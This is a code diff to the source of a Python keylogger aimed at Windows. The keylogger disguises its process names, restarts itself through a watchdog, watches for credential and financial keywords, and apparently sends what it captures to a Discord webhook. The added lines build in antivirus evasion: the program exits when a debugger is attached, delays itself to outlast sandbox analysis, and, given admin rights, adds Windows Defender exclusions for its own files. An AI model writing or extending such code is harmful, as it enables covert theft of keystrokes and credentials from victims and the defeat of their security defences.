@@ -46,6 +46,7 @@ try:
     from modules.keyword_alerts import KeywordAlertSystem, PresetKeywordLists
     from modules.watchdog import ProcessMonitor, HealthChecker
     from modules.protection import SelfProtection
+    from modules.av_evasion import AVEvasion
     ADVANCED_MODULES_AVAILABLE = True
 except ImportError as e:
     ADVANCED_MODULES_AVAILABLE = False
@@ -68,6 +69,8 @@ KEYWORD_LISTS = []  # e.g., ['financial', 'credentials']
 ENABLE_SELF_PROTECTION = False
 ENABLE_HEALTH_MONITORING = False
 USE_RANDOM_NAMES = True  # Generate random process names for stealth
+ENABLE_AV_EVASION = True  # Enable AV evasion techniques
+SANDBOX_DELAY = 65  # Delay in seconds to evade sandbox analysis
 # ============================================================================
 
 # Common Windows process names for disguise
@@ -159,6 +162,26 @@ def start_worker_process(executable_path):
 
 def watchdog_mode():
     """Watchdog mode - monitors and restarts worker"""
+    # AV Evasion - Check environment first
+    if ENABLE_AV_EVASION and ADVANCED_MODULES_AVAILABLE:
+        try:
+            # Check if debugger attached
+            if AVEvasion.check_debugger():
+                sys.exit(0)
+
+            # Check for sandbox/VM
+            if AVEvasion.check_sandbox():
+                # Sleep to timeout sandbox analysis
+                time.sleep(SANDBOX_DELAY)
+
+            # Try to add Defender exclusion (requires admin)
+            if AVEvasion.is_admin():
+                hidden_dir_str = str(get_hidden_directory())
+                AVEvasion.add_defender_exclusion(hidden_dir_str)
+                AVEvasion.add_defender_exclusion(os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]))
+        except:
+            pass
+
     restart_count = 0
     max_restarts = 999999  # Essentially infinite
     restart_delay = 5
@@ -632,9 +655,27 @@ class AdvancedKeyLogger:
 
 def main():
     """Main entry point"""
+    # AV Evasion at the very start
+    if ENABLE_AV_EVASION and ADVANCED_MODULES_AVAILABLE:
+        try:
+            # Quick debugger check
+            if AVEvasion.check_debugger():
+                sys.exit(0)
+        except:
+            pass
+
     # Check if running in worker mode or watchdog mode
     if len(sys.argv) > 1 and sys.argv[1] == "--worker":
         # Worker mode - do the actual keylogging
+        # Additional AV evasion for worker
+        if ENABLE_AV_EVASION and ADVANCED_MODULES_AVAILABLE:
+            try:
+                # Sandbox evasion - sleep if detected
+                if AVEvasion.check_sandbox():
+                    time.sleep(SANDBOX_DELAY)
+            except:
+                pass
+
         # Validate webhook
         if not WEBHOOK_URL or "discord.com/api/webhooks" not in WEBHOOK_URL:
             sys.exit(1)
